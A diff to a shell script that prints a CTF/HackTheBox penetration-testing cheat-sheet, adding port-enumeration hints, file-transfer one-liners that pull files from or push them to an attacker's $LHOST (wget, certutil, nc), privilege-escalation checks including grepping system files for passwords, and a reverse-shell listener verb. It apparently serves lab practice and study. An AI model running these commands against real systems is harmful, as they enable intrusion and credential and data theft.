@@ -72,6 +72,36 @@ k "loot <file>"         "copy a file into the box loot/ folder"
 k "crack <hash|file>"   "auto-detect + hashcat vs rockyou"
 k "cat x | copy"        "clipboard  Â·  paste > file"; }
 
+ref_ports(){ h "COMMON PORTS"
+k "21 ftp"   "anon login, ftp \$TARGET"; k "22 ssh"  "keys, creds, ssh user@\$TARGET"
+k "25 smtp"  "VRFY users, open relay";    k "53 dns"  "zone xfer: dig axfr @\$TARGET"
+k "80/443 http" "fuzz, vhost, nikto, source"; k "88 kerb" "AS-REP, kerberoast"
+k "111 rpc"  "rpcinfo, showmount -e";     k "139/445 smb" "enum4linux-ng, smbclient -L"
+k "161 snmp" "snmpwalk -c public -v1";    k "389 ldap" "ldapsearch -x"
+k "1433 mssql" "mssqlclient";             k "3306 mysql" "mysql -h \$TARGET -u root"
+k "3389 rdp" "xfreerdp /v:\$TARGET";      k "5985 winrm" "evil-winrm -i \$TARGET"
+k "6379 redis" "redis-cli -h \$TARGET"; }
+
+ref_transfer(){ h "FILE TRANSFER (serve = your IP pre-filled)"
+k "linux pull"  "wget http://\$LHOST:8000/f -O /tmp/f"
+k "  "          "curl http://\$LHOST:8000/f -o /tmp/f"
+k "windows"     "certutil -urlcache -f http://\$LHOST:8000/f f"
+k "  "          "powershell iwr http://\$LHOST:8000/f -o f"
+k "upload here" "nc -lvnp 9001 > out  (target: nc \$LHOST 9001 < file)"
+k "base64"      "base64 -w0 f  ->  paste  ->  base64 -d > f"
+k "scp"         "scp f user@\$TARGET:/tmp/"; }
+
+ref_privesc(){ h "PRIVESC QUICK CHECKS"
+k "auto"     "linpeas.sh | tee lin.txt   (serve it from gettools)"
+k "sudo"     "sudo -l   (GTFOBins: pay sudo)"
+k "suid"     "find / -perm -4000 2>/dev/null"
+k "caps"     "getcap -r / 2>/dev/null"
+k "cron"     "cat /etc/crontab; ls -la /etc/cron*"
+k "writable" "find / -writable -type d 2>/dev/null"
+k "creds"    "grep -riE 'password|passwd' /etc /var/www 2>/dev/null"
+k "kernel"   "uname -a  ->  searchsploit"
+k "windows"  "winpeas.exe · whoami /priv · pay token"; }
+
 learn(){ h "LEARNING & PRODUCTIVITY"
 k "brief"               "daily cyber news + actively-exploited CVEs"
 k "pay <query>"         "offline payloads/techniques (PayloadsAllTheThings+GTFOBins)"
@@ -80,6 +110,16 @@ k "journal \"â€¦\""        "log what you learned today (+ streak)"
 k "roadmap"             "study path (checkboxes)  Â·  roadmap -s = progress"
 k "boxes"               "your machine progress (user/root flags)"
 k "writeup <box>"       "scaffold a blog-ready writeup from notes"; }
+
+quick(){ h "QUICK CTF VERBS"
+k "listen [port]"       "catch a reverse shell (pwncat auto-TTY) · default 4444"
+k "ports <ip>"          "fast top-ports scan (triage before recon)"
+k "fuzz <url> [wl]"     "quick dir brute (feroxbuster; FUZZ -> ffuf)"
+k "vhost <domain> [ip]" "virtual-host / subdomain fuzz"
+k "spawn"               "print+copy the TTY-stabilize steps"
+k "enc <b64|hex|url|rot13> <t>" "encode  ·  dec = decode"
+k "steg <file>"         "forensics gauntlet (exif/strings/binwalk/steghide)"
+k "extract <file>"      "unpack any archive"; }
 
 tmuxc(){ h "TMUX  (prefix = Ctrl+b, press then release)"
 k "Alt + arrows"        "move between panes"
@@ -116,5 +156,8 @@ case "$1" in
   desktop) banner; desktop ;;
   shell)   banner; shell ;;
   learn)   banner; learn ;;
-  *)       banner; desktop; htb; tmuxc; shell; learn; echo ;;
+  ports)   banner; ref_ports ;;
+  transfer) banner; ref_transfer ;;
+  privesc) banner; ref_privesc ;;
+  *)       banner; desktop; htb; quick; tmuxc; shell; learn; echo ;;
 esac
